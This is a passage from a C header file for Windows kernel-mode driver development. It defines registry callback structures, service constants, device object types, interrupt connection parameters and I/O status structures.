typedef struct _REG_UNLOAD_KEY_INFORMATION {
  PVOID Object;
  PVOID UserEvent;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_UNLOAD_KEY_INFORMATION, *PREG_UNLOAD_KEY_INFORMATION;

typedef struct _REG_CALLBACK_CONTEXT_CLEANUP_INFORMATION {
  PVOID Object;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_CALLBACK_CONTEXT_CLEANUP_INFORMATION, *PREG_CALLBACK_CONTEXT_CLEANUP_INFORMATION;

typedef struct _REG_QUERY_KEY_SECURITY_INFORMATION {
  PVOID Object;
  PSECURITY_INFORMATION SecurityInformation;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
  PULONG Length;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_QUERY_KEY_SECURITY_INFORMATION, *PREG_QUERY_KEY_SECURITY_INFORMATION;

typedef struct _REG_SET_KEY_SECURITY_INFORMATION {
  PVOID Object;
  PSECURITY_INFORMATION SecurityInformation;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_SET_KEY_SECURITY_INFORMATION, *PREG_SET_KEY_SECURITY_INFORMATION;

typedef struct _REG_RESTORE_KEY_INFORMATION {
  PVOID Object;
  HANDLE FileHandle;
  ULONG Flags;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_RESTORE_KEY_INFORMATION, *PREG_RESTORE_KEY_INFORMATION;

typedef struct _REG_SAVE_KEY_INFORMATION {
  PVOID Object;
  HANDLE FileHandle;
  ULONG Format;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_SAVE_KEY_INFORMATION, *PREG_SAVE_KEY_INFORMATION;

typedef struct _REG_REPLACE_KEY_INFORMATION {
  PVOID Object;
  PUNICODE_STRING OldFileName;
  PUNICODE_STRING NewFileName;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_REPLACE_KEY_INFORMATION, *PREG_REPLACE_KEY_INFORMATION;

#endif /* NTDDI_VERSION >= NTDDI_VISTA */

#define SERVICE_KERNEL_DRIVER          0x00000001
#define SERVICE_FILE_SYSTEM_DRIVER     0x00000002
#define SERVICE_ADAPTER                0x00000004
#define SERVICE_RECOGNIZER_DRIVER      0x00000008

#define SERVICE_DRIVER                 (SERVICE_KERNEL_DRIVER | \
                                        SERVICE_FILE_SYSTEM_DRIVER | \
                                        SERVICE_RECOGNIZER_DRIVER)

#define SERVICE_WIN32_OWN_PROCESS      0x00000010
#define SERVICE_WIN32_SHARE_PROCESS    0x00000020
#define SERVICE_WIN32                  (SERVICE_WIN32_OWN_PROCESS | \
                                        SERVICE_WIN32_SHARE_PROCESS)

#define SERVICE_INTERACTIVE_PROCESS    0x00000100

#define SERVICE_TYPE_ALL               (SERVICE_WIN32  | \
                                        SERVICE_ADAPTER | \
                                        SERVICE_DRIVER  | \
                                        SERVICE_INTERACTIVE_PROCESS)

/* Service Start Types */
#define SERVICE_BOOT_START             0x00000000
#define SERVICE_SYSTEM_START           0x00000001
#define SERVICE_AUTO_START             0x00000002
#define SERVICE_DEMAND_START           0x00000003
#define SERVICE_DISABLED               0x00000004

#define SERVICE_ERROR_IGNORE           0x00000000
#define SERVICE_ERROR_NORMAL           0x00000001
#define SERVICE_ERROR_SEVERE           0x00000002
#define SERVICE_ERROR_CRITICAL         0x00000003

typedef enum _CM_SERVICE_NODE_TYPE {
  DriverType = SERVICE_KERNEL_DRIVER,
  FileSystemType = SERVICE_FILE_SYSTEM_DRIVER,
  Win32ServiceOwnProcess = SERVICE_WIN32_OWN_PROCESS,
  Win32ServiceShareProcess = SERVICE_WIN32_SHARE_PROCESS,
  AdapterType = SERVICE_ADAPTER,
  RecognizerType = SERVICE_RECOGNIZER_DRIVER
} SERVICE_NODE_TYPE;

typedef enum _CM_SERVICE_LOAD_TYPE {
  BootLoad = SERVICE_BOOT_START,
  SystemLoad = SERVICE_SYSTEM_START,
  AutoLoad = SERVICE_AUTO_START,
  DemandLoad = SERVICE_DEMAND_START,
  DisableLoad = SERVICE_DISABLED
} SERVICE_LOAD_TYPE;

typedef enum _CM_ERROR_CONTROL_TYPE {
  IgnoreError = SERVICE_ERROR_IGNORE,
  NormalError = SERVICE_ERROR_NORMAL,
  SevereError = SERVICE_ERROR_SEVERE,
  CriticalError = SERVICE_ERROR_CRITICAL
} SERVICE_ERROR_TYPE;

#define CM_SERVICE_NETWORK_BOOT_LOAD      0x00000001
#define CM_SERVICE_VIRTUAL_DISK_BOOT_LOAD 0x00000002
#define CM_SERVICE_USB_DISK_BOOT_LOAD     0x00000004

#define CM_SERVICE_VALID_PROMOTION_MASK (CM_SERVICE_NETWORK_BOOT_LOAD |       \
                                         CM_SERVICE_VIRTUAL_DISK_BOOT_LOAD |  \
                                         CM_SERVICE_USB_DISK_BOOT_LOAD)


/******************************************************************************
 *                         I/O Manager Types                                  *
 ******************************************************************************/

#define STATUS_CONTINUE_COMPLETION      STATUS_SUCCESS

#define CONNECT_FULLY_SPECIFIED         0x1
#define CONNECT_LINE_BASED              0x2
#define CONNECT_MESSAGE_BASED           0x3
#define CONNECT_FULLY_SPECIFIED_GROUP   0x4
#define CONNECT_CURRENT_VERSION         0x4

#define POOL_COLD_ALLOCATION                256
#define POOL_QUOTA_FAIL_INSTEAD_OF_RAISE    8
#define POOL_RAISE_IF_ALLOCATION_FAILURE    16

#define IO_TYPE_ADAPTER                 1
#define IO_TYPE_CONTROLLER              2
#define IO_TYPE_DEVICE                  3
#define IO_TYPE_DRIVER                  4
#define IO_TYPE_FILE                    5
#define IO_TYPE_IRP                     6
#define IO_TYPE_MASTER_ADAPTER          7
#define IO_TYPE_OPEN_PACKET             8
#define IO_TYPE_TIMER                   9
#define IO_TYPE_VPB                     10
#define IO_TYPE_ERROR_LOG               11
#define IO_TYPE_ERROR_MESSAGE           12
#define IO_TYPE_DEVICE_OBJECT_EXTENSION 13

#define IO_TYPE_CSQ_IRP_CONTEXT 1
#define IO_TYPE_CSQ 2
#define IO_TYPE_CSQ_EX 3

/* IO_RESOURCE_DESCRIPTOR.Option */
#define IO_RESOURCE_PREFERRED             0x01
#define IO_RESOURCE_DEFAULT               0x02
#define IO_RESOURCE_ALTERNATIVE           0x08

#define FILE_DEVICE_BEEP                  0x00000001
#define FILE_DEVICE_CD_ROM                0x00000002
#define FILE_DEVICE_CD_ROM_FILE_SYSTEM    0x00000003
#define FILE_DEVICE_CONTROLLER            0x00000004
#define FILE_DEVICE_DATALINK              0x00000005
#define FILE_DEVICE_DFS                   0x00000006
#define FILE_DEVICE_DISK                  0x00000007
#define FILE_DEVICE_DISK_FILE_SYSTEM      0x00000008
#define FILE_DEVICE_FILE_SYSTEM           0x00000009
#define FILE_DEVICE_INPORT_PORT           0x0000000a
#define FILE_DEVICE_KEYBOARD              0x0000000b
#define FILE_DEVICE_MAILSLOT              0x0000000c
#define FILE_DEVICE_MIDI_IN               0x0000000d
#define FILE_DEVICE_MIDI_OUT              0x0000000e
#define FILE_DEVICE_MOUSE                 0x0000000f
#define FILE_DEVICE_MULTI_UNC_PROVIDER    0x00000010
#define FILE_DEVICE_NAMED_PIPE            0x00000011
#define FILE_DEVICE_NETWORK               0x00000012
#define FILE_DEVICE_NETWORK_BROWSER       0x00000013
#define FILE_DEVICE_NETWORK_FILE_SYSTEM   0x00000014
#define FILE_DEVICE_NULL                  0x00000015
#define FILE_DEVICE_PARALLEL_PORT         0x00000016
#define FILE_DEVICE_PHYSICAL_NETCARD      0x00000017
#define FILE_DEVICE_PRINTER               0x00000018
#define FILE_DEVICE_SCANNER               0x00000019
#define FILE_DEVICE_SERIAL_MOUSE_PORT     0x0000001a
#define FILE_DEVICE_SERIAL_PORT           0x0000001b
#define FILE_DEVICE_SCREEN                0x0000001c
#define FILE_DEVICE_SOUND                 0x0000001d
#define FILE_DEVICE_STREAMS               0x0000001e
#define FILE_DEVICE_TAPE                  0x0000001f
#define FILE_DEVICE_TAPE_FILE_SYSTEM      0x00000020
#define FILE_DEVICE_TRANSPORT             0x00000021
#define FILE_DEVICE_UNKNOWN               0x00000022
#define FILE_DEVICE_VIDEO                 0x00000023
#define FILE_DEVICE_VIRTUAL_DISK          0x00000024
#define FILE_DEVICE_WAVE_IN               0x00000025
#define FILE_DEVICE_WAVE_OUT              0x00000026
#define FILE_DEVICE_8042_PORT             0x00000027
#define FILE_DEVICE_NETWORK_REDIRECTOR    0x00000028
#define FILE_DEVICE_BATTERY               0x00000029
#define FILE_DEVICE_BUS_EXTENDER          0x0000002a
#define FILE_DEVICE_MODEM                 0x0000002b
#define FILE_DEVICE_VDM                   0x0000002c
#define FILE_DEVICE_MASS_STORAGE          0x0000002d
#define FILE_DEVICE_SMB                   0x0000002e
#define FILE_DEVICE_KS                    0x0000002f
#define FILE_DEVICE_CHANGER               0x00000030
#define FILE_DEVICE_SMARTCARD             0x00000031
#define FILE_DEVICE_ACPI                  0x00000032
#define FILE_DEVICE_DVD                   0x00000033
#define FILE_DEVICE_FULLSCREEN_VIDEO      0x00000034
#define FILE_DEVICE_DFS_FILE_SYSTEM       0x00000035
#define FILE_DEVICE_DFS_VOLUME            0x00000036
#define FILE_DEVICE_SERENUM               0x00000037
#define FILE_DEVICE_TERMSRV               0x00000038
#define FILE_DEVICE_KSEC                  0x00000039
#define FILE_DEVICE_FIPS                  0x0000003A
#define FILE_DEVICE_INFINIBAND            0x0000003B
#define FILE_DEVICE_VMBUS                 0x0000003E
#define FILE_DEVICE_CRYPT_PROVIDER        0x0000003F
#define FILE_DEVICE_WPD                   0x00000040
#define FILE_DEVICE_BLUETOOTH             0x00000041
#define FILE_DEVICE_MT_COMPOSITE          0x00000042
#define FILE_DEVICE_MT_TRANSPORT          0x00000043
#define FILE_DEVICE_BIOMETRIC             0x00000044
#define FILE_DEVICE_PMI                   0x00000045

#if defined(NT_PROCESSOR_GROUPS)

typedef USHORT IRQ_DEVICE_POLICY, *PIRQ_DEVICE_POLICY;

typedef enum _IRQ_DEVICE_POLICY_USHORT {
  IrqPolicyMachineDefault = 0,
  IrqPolicyAllCloseProcessors = 1,
  IrqPolicyOneCloseProcessor = 2,
  IrqPolicyAllProcessorsInMachine = 3,
  IrqPolicyAllProcessorsInGroup = 3,
  IrqPolicySpecifiedProcessors = 4,
  IrqPolicySpreadMessagesAcrossAllProcessors = 5,
  IrqPolicyAllProcessorsInMachineWhenSteered = 6,
  IrqPolicyAllProcessorsInGroupWhenSteered = 6
};

#else /* defined(NT_PROCESSOR_GROUPS) */

typedef enum _IRQ_DEVICE_POLICY {
  IrqPolicyMachineDefault = 0,
  IrqPolicyAllCloseProcessors,
  IrqPolicyOneCloseProcessor,
  IrqPolicyAllProcessorsInMachine,
  IrqPolicySpecifiedProcessors,
  IrqPolicySpreadMessagesAcrossAllProcessors,
  IrqPolicyAllProcessorsInMachineWhenSteered
} IRQ_DEVICE_POLICY, *PIRQ_DEVICE_POLICY;

#endif

typedef enum _IRQ_PRIORITY {
  IrqPriorityUndefined = 0,
  IrqPriorityLow,
  IrqPriorityNormal,
  IrqPriorityHigh
} IRQ_PRIORITY, *PIRQ_PRIORITY;

typedef enum _IRQ_GROUP_POLICY {
  GroupAffinityAllGroupZero = 0,
  GroupAffinityDontCare
} IRQ_GROUP_POLICY, *PIRQ_GROUP_POLICY;

#define MAXIMUM_VOLUME_LABEL_LENGTH       (32 * sizeof(WCHAR))

typedef struct _OBJECT_HANDLE_INFORMATION {
  ULONG HandleAttributes;
  ACCESS_MASK GrantedAccess;
} OBJECT_HANDLE_INFORMATION, *POBJECT_HANDLE_INFORMATION;

typedef struct _CLIENT_ID {
  HANDLE UniqueProcess;
  HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _VPB {
  CSHORT Type;
  CSHORT Size;
  USHORT Flags;
  USHORT VolumeLabelLength;
  struct _DEVICE_OBJECT *DeviceObject;
  struct _DEVICE_OBJECT *RealDevice;
  ULONG SerialNumber;
  ULONG ReferenceCount;
  WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, *PVPB;

typedef enum _IO_ALLOCATION_ACTION {
  KeepObject = 1,
  DeallocateObject,
  DeallocateObjectKeepRegisters
} IO_ALLOCATION_ACTION, *PIO_ALLOCATION_ACTION;

typedef IO_ALLOCATION_ACTION
(NTAPI DRIVER_CONTROL)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp,
  IN PVOID MapRegisterBase,
  IN PVOID Context);
typedef DRIVER_CONTROL *PDRIVER_CONTROL;

typedef struct _WAIT_CONTEXT_BLOCK {
  KDEVICE_QUEUE_ENTRY WaitQueueEntry;
  PDRIVER_CONTROL DeviceRoutine;
  PVOID DeviceContext;
  ULONG NumberOfMapRegisters;
  PVOID DeviceObject;
  PVOID CurrentIrp;
  PKDPC BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, *PWAIT_CONTEXT_BLOCK;

/* DEVICE_OBJECT.Flags */
#define DO_VERIFY_VOLUME                  0x00000002
#define DO_BUFFERED_IO                    0x00000004
#define DO_EXCLUSIVE                      0x00000008
#define DO_DIRECT_IO                      0x00000010
#define DO_MAP_IO_BUFFER                  0x00000020
#define DO_DEVICE_INITIALIZING            0x00000080
#define DO_SHUTDOWN_REGISTERED            0x00000800
#define DO_BUS_ENUMERATED_DEVICE          0x00001000
#define DO_POWER_PAGABLE                  0x00002000
#define DO_POWER_INRUSH                   0x00004000

/* DEVICE_OBJECT.Characteristics */
#define FILE_REMOVABLE_MEDIA              0x00000001
#define FILE_READ_ONLY_DEVICE             0x00000002
#define FILE_FLOPPY_DISKETTE              0x00000004
#define FILE_WRITE_ONCE_MEDIA             0x00000008
#define FILE_REMOTE_DEVICE                0x00000010
#define FILE_DEVICE_IS_MOUNTED            0x00000020
#define FILE_VIRTUAL_VOLUME               0x00000040
#define FILE_AUTOGENERATED_DEVICE_NAME    0x00000080
#define FILE_DEVICE_SECURE_OPEN           0x00000100
#define FILE_CHARACTERISTIC_PNP_DEVICE    0x00000800
#define FILE_CHARACTERISTIC_TS_DEVICE     0x00001000
#define FILE_CHARACTERISTIC_WEBDAV_DEVICE 0x00002000

/* DEVICE_OBJECT.AlignmentRequirement */
#define FILE_BYTE_ALIGNMENT             0x00000000
#define FILE_WORD_ALIGNMENT             0x00000001
#define FILE_LONG_ALIGNMENT             0x00000003
#define FILE_QUAD_ALIGNMENT             0x00000007
#define FILE_OCTA_ALIGNMENT             0x0000000f
#define FILE_32_BYTE_ALIGNMENT          0x0000001f
#define FILE_64_BYTE_ALIGNMENT          0x0000003f
#define FILE_128_BYTE_ALIGNMENT         0x0000007f
#define FILE_256_BYTE_ALIGNMENT         0x000000ff
#define FILE_512_BYTE_ALIGNMENT         0x000001ff

/* DEVICE_OBJECT.DeviceType */
#define DEVICE_TYPE ULONG

typedef struct _DEVICE_OBJECT {
  CSHORT Type;
  USHORT Size;
  LONG ReferenceCount;
  struct _DRIVER_OBJECT *DriverObject;
  struct _DEVICE_OBJECT *NextDevice;
  struct _DEVICE_OBJECT *AttachedDevice;
  struct _IRP *CurrentIrp;
  PIO_TIMER Timer;
  ULONG Flags;
  ULONG Characteristics;
  volatile PVPB Vpb;
  PVOID DeviceExtension;
  DEVICE_TYPE DeviceType;
  CCHAR StackSize;
  union {
    LIST_ENTRY ListEntry;
    WAIT_CONTEXT_BLOCK Wcb;
  } Queue;
  ULONG AlignmentRequirement;
  KDEVICE_QUEUE DeviceQueue;
  KDPC Dpc;
  ULONG ActiveThreadCount;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
  KEVENT DeviceLock;
  USHORT SectorSize;
  USHORT Spare1;
  struct _DEVOBJ_EXTENSION *DeviceObjectExtension;
  PVOID Reserved;
} DEVICE_OBJECT, *PDEVICE_OBJECT;

typedef enum _IO_SESSION_STATE {
  IoSessionStateCreated = 1,
  IoSessionStateInitialized,
  IoSessionStateConnected,
  IoSessionStateDisconnected,
  IoSessionStateDisconnectedLoggedOn,
  IoSessionStateLoggedOn,
  IoSessionStateLoggedOff,
  IoSessionStateTerminated,
  IoSessionStateMax
} IO_SESSION_STATE, *PIO_SESSION_STATE;

typedef enum _IO_COMPLETION_ROUTINE_RESULT {
  ContinueCompletion = STATUS_CONTINUE_COMPLETION,
  StopCompletion = STATUS_MORE_PROCESSING_REQUIRED
} IO_COMPLETION_ROUTINE_RESULT, *PIO_COMPLETION_ROUTINE_RESULT;

typedef struct _IO_INTERRUPT_MESSAGE_INFO_ENTRY {
  PHYSICAL_ADDRESS MessageAddress;
  KAFFINITY TargetProcessorSet;
  PKINTERRUPT InterruptObject;
  ULONG MessageData;
  ULONG Vector;
  KIRQL Irql;
  KINTERRUPT_MODE Mode;
  KINTERRUPT_POLARITY Polarity;
} IO_INTERRUPT_MESSAGE_INFO_ENTRY, *PIO_INTERRUPT_MESSAGE_INFO_ENTRY;

typedef struct _IO_INTERRUPT_MESSAGE_INFO {
  KIRQL UnifiedIrql;
  ULONG MessageCount;
  IO_INTERRUPT_MESSAGE_INFO_ENTRY MessageInfo[1];
} IO_INTERRUPT_MESSAGE_INFO, *PIO_INTERRUPT_MESSAGE_INFO;

typedef struct _IO_CONNECT_INTERRUPT_FULLY_SPECIFIED_PARAMETERS {
  IN PDEVICE_OBJECT PhysicalDeviceObject;
  OUT PKINTERRUPT *InterruptObject;
  IN PKSERVICE_ROUTINE ServiceRoutine;
  IN PVOID ServiceContext;
  IN PKSPIN_LOCK SpinLock OPTIONAL;
  IN KIRQL SynchronizeIrql;
  IN BOOLEAN FloatingSave;
  IN BOOLEAN ShareVector;
  IN ULONG Vector;
  IN KIRQL Irql;
  IN KINTERRUPT_MODE InterruptMode;
  IN KAFFINITY ProcessorEnableMask;
  IN USHORT Group;
} IO_CONNECT_INTERRUPT_FULLY_SPECIFIED_PARAMETERS, *PIO_CONNECT_INTERRUPT_FULLY_SPECIFIED_PARAMETERS;

typedef struct _IO_CONNECT_INTERRUPT_LINE_BASED_PARAMETERS {
  IN PDEVICE_OBJECT PhysicalDeviceObject;
  OUT PKINTERRUPT *InterruptObject;
  IN PKSERVICE_ROUTINE ServiceRoutine;
  IN PVOID ServiceContext;
  IN PKSPIN_LOCK SpinLock OPTIONAL;
  IN KIRQL SynchronizeIrql OPTIONAL;
  IN BOOLEAN FloatingSave;
} IO_CONNECT_INTERRUPT_LINE_BASED_PARAMETERS, *PIO_CONNECT_INTERRUPT_LINE_BASED_PARAMETERS;

typedef struct _IO_CONNECT_INTERRUPT_MESSAGE_BASED_PARAMETERS {
  IN PDEVICE_OBJECT PhysicalDeviceObject;
  union {
    OUT PVOID *Generic;
    OUT PIO_INTERRUPT_MESSAGE_INFO *InterruptMessageTable;
    OUT PKINTERRUPT *InterruptObject;
  } ConnectionContext;
  IN PKMESSAGE_SERVICE_ROUTINE MessageServiceRoutine;
  IN PVOID ServiceContext;
  IN PKSPIN_LOCK SpinLock OPTIONAL;
  IN KIRQL SynchronizeIrql OPTIONAL;
  IN BOOLEAN FloatingSave;
  IN PKSERVICE_ROUTINE FallBackServiceRoutine OPTIONAL;
} IO_CONNECT_INTERRUPT_MESSAGE_BASED_PARAMETERS, *PIO_CONNECT_INTERRUPT_MESSAGE_BASED_PARAMETERS;

typedef struct _IO_CONNECT_INTERRUPT_PARAMETERS {
  IN OUT ULONG Version;
  _ANONYMOUS_UNION union {
    IO_CONNECT_INTERRUPT_FULLY_SPECIFIED_PARAMETERS FullySpecified;
    IO_CONNECT_INTERRUPT_LINE_BASED_PARAMETERS LineBased;
    IO_CONNECT_INTERRUPT_MESSAGE_BASED_PARAMETERS MessageBased;
  } DUMMYUNIONNAME;
} IO_CONNECT_INTERRUPT_PARAMETERS, *PIO_CONNECT_INTERRUPT_PARAMETERS;

typedef struct _IO_DISCONNECT_INTERRUPT_PARAMETERS {
  IN ULONG Version;
  union {
    IN PVOID Generic;
    IN PKINTERRUPT InterruptObject;
    IN PIO_INTERRUPT_MESSAGE_INFO InterruptMessageTable;
  } ConnectionContext;
} IO_DISCONNECT_INTERRUPT_PARAMETERS, *PIO_DISCONNECT_INTERRUPT_PARAMETERS;

typedef enum _IO_ACCESS_TYPE {
  ReadAccess,
  WriteAccess,
  ModifyAccess
} IO_ACCESS_TYPE;

typedef enum _IO_ACCESS_MODE {
  SequentialAccess,
  RandomAccess
} IO_ACCESS_MODE;

typedef enum _IO_CONTAINER_NOTIFICATION_CLASS {
  IoSessionStateNotification,
  IoMaxContainerNotificationClass
} IO_CONTAINER_NOTIFICATION_CLASS;

typedef struct _IO_SESSION_STATE_NOTIFICATION {
  ULONG Size;
  ULONG Flags;
  PVOID IoObject;
  ULONG EventMask;
  PVOID Context;
} IO_SESSION_STATE_NOTIFICATION, *PIO_SESSION_STATE_NOTIFICATION;

typedef enum _IO_CONTAINER_INFORMATION_CLASS {
  IoSessionStateInformation,
  IoMaxContainerInformationClass
} IO_CONTAINER_INFORMATION_CLASS;

typedef struct _IO_SESSION_STATE_INFORMATION {
  ULONG SessionId;
  IO_SESSION_STATE SessionState;
  BOOLEAN LocalSession;
} IO_SESSION_STATE_INFORMATION, *PIO_SESSION_STATE_INFORMATION;

#if (NTDDI_VERSION >= NTDDI_WIN7)

typedef NTSTATUS
(NTAPI *PIO_CONTAINER_NOTIFICATION_FUNCTION)(
  VOID);

typedef NTSTATUS
(NTAPI IO_SESSION_NOTIFICATION_FUNCTION)(
  IN PVOID SessionObject,
  IN PVOID IoObject,
  IN ULONG Event,
  IN PVOID Context,
  IN PVOID NotificationPayload,
  IN ULONG PayloadLength);

typedef IO_SESSION_NOTIFICATION_FUNCTION *PIO_SESSION_NOTIFICATION_FUNCTION;

#endif

typedef struct _IO_REMOVE_LOCK_TRACKING_BLOCK * PIO_REMOVE_LOCK_TRACKING_BLOCK;

typedef struct _IO_REMOVE_LOCK_COMMON_BLOCK {
  BOOLEAN Removed;
  BOOLEAN Reserved[3];
  volatile LONG IoCount;
  KEVENT RemoveEvent;
} IO_REMOVE_LOCK_COMMON_BLOCK;

typedef struct _IO_REMOVE_LOCK_DBG_BLOCK {
  LONG Signature;
  LONG HighWatermark;
  LONGLONG MaxLockedTicks;
  LONG AllocateTag;
  LIST_ENTRY LockList;
  KSPIN_LOCK Spin;
  volatile LONG LowMemoryCount;
  ULONG Reserved1[4];
  PVOID Reserved2;
  PIO_REMOVE_LOCK_TRACKING_BLOCK Blocks;
} IO_REMOVE_LOCK_DBG_BLOCK;

typedef struct _IO_REMOVE_LOCK {
  IO_REMOVE_LOCK_COMMON_BLOCK Common;
#if DBG
  IO_REMOVE_LOCK_DBG_BLOCK Dbg;
#endif
} IO_REMOVE_LOCK, *PIO_REMOVE_LOCK;

typedef struct _IO_WORKITEM *PIO_WORKITEM;

typedef VOID
(NTAPI IO_WORKITEM_ROUTINE)(
  IN PDEVICE_OBJECT DeviceObject,
  IN PVOID Context);
typedef IO_WORKITEM_ROUTINE *PIO_WORKITEM_ROUTINE;

typedef VOID
(NTAPI IO_WORKITEM_ROUTINE_EX)(
  IN PVOID IoObject,
  IN PVOID Context OPTIONAL,
  IN PIO_WORKITEM IoWorkItem);
typedef IO_WORKITEM_ROUTINE_EX *PIO_WORKITEM_ROUTINE_EX;

typedef struct _SHARE_ACCESS {
  ULONG OpenCount;
  ULONG Readers;
  ULONG Writers;
  ULONG Deleters;
  ULONG SharedRead;
  ULONG SharedWrite;
  ULONG SharedDelete;
} SHARE_ACCESS, *PSHARE_ACCESS;

/* While MS WDK uses inheritance in C++, we cannot do this with gcc, as
   inheritance, even from a struct renders the type non-POD. So we use
   this hack */
#define PCI_COMMON_HEADER_LAYOUT                \
  USHORT VendorID;                              \
  USHORT DeviceID;                              \
  USHORT Command;                               \
  USHORT Status;                                \
  UCHAR RevisionID;                             \
  UCHAR ProgIf;                                 \
  UCHAR SubClass;                               \
  UCHAR BaseClass;                              \
  UCHAR CacheLineSize;                          \
  UCHAR LatencyTimer;                           \
  UCHAR HeaderType;                             \
  UCHAR BIST;                                   \
  union {                                       \
    struct /* _PCI_HEADER_TYPE_0 */ {                 \
      ULONG BaseAddresses[PCI_TYPE0_ADDRESSES]; \
      ULONG CIS;                                \
      USHORT SubVendorID;                       \
      USHORT SubSystemID;                       \
      ULONG ROMBaseAddress;                     \
      UCHAR CapabilitiesPtr;                    \
      UCHAR Reserved1[3];                       \
      ULONG Reserved2;                          \
      UCHAR InterruptLine;                      \
      UCHAR InterruptPin;                       \
      UCHAR MinimumGrant;                       \
      UCHAR MaximumLatency;                     \
    } type0;                                    \
    struct /* _PCI_HEADER_TYPE_1 */ {                 \
      ULONG BaseAddresses[PCI_TYPE1_ADDRESSES]; \
      UCHAR PrimaryBus;                         \
      UCHAR SecondaryBus;                       \
      UCHAR SubordinateBus;                     \
      UCHAR SecondaryLatency;                   \
      UCHAR IOBase;                             \
      UCHAR IOLimit;                            \
      USHORT SecondaryStatus;                   \
      USHORT MemoryBase;                        \
      USHORT MemoryLimit;                       \
      USHORT PrefetchBase;                      \
      USHORT PrefetchLimit;                     \
      ULONG PrefetchBaseUpper32;                \
      ULONG PrefetchLimitUpper32;               \
      USHORT IOBaseUpper16;                     \
      USHORT IOLimitUpper16;                    \
      UCHAR CapabilitiesPtr;                    \
      UCHAR Reserved1[3];                       \
      ULONG ROMBaseAddress;                     \
      UCHAR InterruptLine;                      \
      UCHAR InterruptPin;                       \
      USHORT BridgeControl;                     \
    } type1;                                    \
    struct /* _PCI_HEADER_TYPE_2 */ {                 \
      ULONG SocketRegistersBaseAddress;         \
      UCHAR CapabilitiesPtr;                    \
      UCHAR Reserved;                           \
      USHORT SecondaryStatus;                   \
      UCHAR PrimaryBus;                         \
      UCHAR SecondaryBus;                       \
      UCHAR SubordinateBus;                     \
      UCHAR SecondaryLatency;                   \
      struct {                                  \
        ULONG Base;                             \
        ULONG Limit;                            \
      } Range[PCI_TYPE2_ADDRESSES-1];           \
      UCHAR InterruptLine;                      \
      UCHAR InterruptPin;                       \
      USHORT BridgeControl;                     \
    } type2;                                    \
  } u;

typedef enum _CREATE_FILE_TYPE {
  CreateFileTypeNone,
  CreateFileTypeNamedPipe,
  CreateFileTypeMailslot
} CREATE_FILE_TYPE;

typedef struct _NAMED_PIPE_CREATE_PARAMETERS {
  ULONG NamedPipeType;
  ULONG ReadMode;
  ULONG CompletionMode;
  ULONG MaximumInstances;
  ULONG InboundQuota;
  ULONG OutboundQuota;
  LARGE_INTEGER DefaultTimeout;
  BOOLEAN TimeoutSpecified;
} NAMED_PIPE_CREATE_PARAMETERS, *PNAMED_PIPE_CREATE_PARAMETERS;

typedef struct _MAILSLOT_CREATE_PARAMETERS {
  ULONG MailslotQuota;
  ULONG MaximumMessageSize;
  LARGE_INTEGER ReadTimeout;
  BOOLEAN TimeoutSpecified;
} MAILSLOT_CREATE_PARAMETERS, *PMAILSLOT_CREATE_PARAMETERS;

#define IO_FORCE_ACCESS_CHECK               0x001
#define IO_NO_PARAMETER_CHECKING            0x100

#define IO_REPARSE                      0x0
#define IO_REMOUNT                      0x1

typedef struct _IO_STATUS_BLOCK {
  _ANONYMOUS_UNION union {
    NTSTATUS Status;
    PVOID Pointer;
  } DUMMYUNIONNAME;
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#if defined(_WIN64)
typedef struct _IO_STATUS_BLOCK32 {
  NTSTATUS Status;
  ULONG Information;
} IO_STATUS_BLOCK32, *PIO_STATUS_BLOCK32;
#endif

typedef VOID
(NTAPI *PIO_APC_ROUTINE)(
  IN PVOID ApcContext,
  IN PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG Reserved);

#define PIO_APC_ROUTINE_DEFINED

typedef enum _IO_SESSION_EVENT {
  IoSessionEventIgnore = 0,
  IoSessionEventCreated,
  IoSessionEventTerminated,
  IoSessionEventConnected,
  IoSessionEventDisconnected,
  IoSessionEventLogon,
  IoSessionEventLogoff,
  IoSessionEventMax
} IO_SESSION_EVENT, *PIO_SESSION_EVENT;

#define IO_SESSION_STATE_ALL_EVENTS        0xffffffff
#define IO_SESSION_STATE_CREATION_EVENT    0x00000001
#define IO_SESSION_STATE_TERMINATION_EVENT 0x00000002
#define IO_SESSION_STATE_CONNECT_EVENT     0x00000004
#define IO_SESSION_STATE_DISCONNECT_EVENT  0x00000008
#define IO_SESSION_STATE_LOGON_EVENT       0x00000010
#define IO_SESSION_STATE_LOGOFF_EVENT      0x00000020

#define IO_SESSION_STATE_VALID_EVENT_MASK  0x0000003f

#define IO_SESSION_MAX_PAYLOAD_SIZE        256L

typedef struct _IO_SESSION_CONNECT_INFO {
  ULONG SessionId;
  BOOLEAN LocalSession;
} IO_SESSION_CONNECT_INFO, *PIO_SESSION_CONNECT_INFO;

#define EVENT_INCREMENT                   1
#define IO_NO_INCREMENT                   0
#define IO_CD_ROM_INCREMENT               1
#define IO_DISK_INCREMENT                 1
#define IO_KEYBOARD_INCREMENT             6
#define IO_MAILSLOT_INCREMENT             2
#define IO_MOUSE_INCREMENT                6
#define IO_NAMED_PIPE_INCREMENT           2
#define IO_NETWORK_INCREMENT              2
#define IO_PARALLEL_INCREMENT             1
#define IO_SERIAL_INCREMENT               2
#define IO_SOUND_INCREMENT                8
#define IO_VIDEO_INCREMENT                1
#define SEMAPHORE_INCREMENT               1

#define MM_MAXIMUM_DISK_IO_SIZE          (0x10000)

typedef struct _BOOTDISK_INFORMATION {
  LONGLONG BootPartitionOffset;
  LONGLONG SystemPartitionOffset;
  ULONG BootDeviceSignature;
  ULONG SystemDeviceSignature;
